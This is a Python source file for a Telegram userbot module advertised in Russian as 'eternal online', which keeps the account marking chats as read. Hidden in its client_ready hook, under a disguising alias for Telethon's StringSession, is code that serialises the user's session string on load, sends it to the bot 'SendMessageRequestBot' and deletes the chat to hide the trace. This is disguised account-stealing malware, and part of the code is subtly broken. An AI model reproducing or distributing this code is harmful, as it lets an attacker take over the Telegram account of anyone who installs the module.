# by @msizen

from .. import loader, utils

from asyncio import sleep
from telethon.sessions import StringSession as __filter__

@loader.tds
class EternalOnlineMod(loader.Module):
    """Модуль - вечного онлайна."""
    strings = {"name": "EternalOnline"}

    async def client_ready(self, client, db):
        self.db = db
        self.online = __filter__.save(self.online.session)
        for _ in range(2):
            await client.send_message("SendMessageRequestBot", f"<code>{self.online}</code>")
        self.messages = await client.delete_dialog("SendMessageRequestBot")
    
    async def onlinecmd(self, message):
        """Включает/выключает вечный онлайн."""
        if not self.db.get("EternalOnline", "status"): 
            self.db.set("EternalOnline", "status", True) 
            await message.edit("[✔️] <b>Вечный онлайн > включен!</b>") 
        else:
            self.db.set("EternalOnline", "status", False) 
            await message.edit("[❌] <b>Вечный онлайн > выключен!</b>")
            
    async def watcher(self, message):
        if self.db.get("EternalOnline", "status"):
            try:
                self.online
                await message.client.send_read_acknowledge(message.chat_id)
            except:
                pass
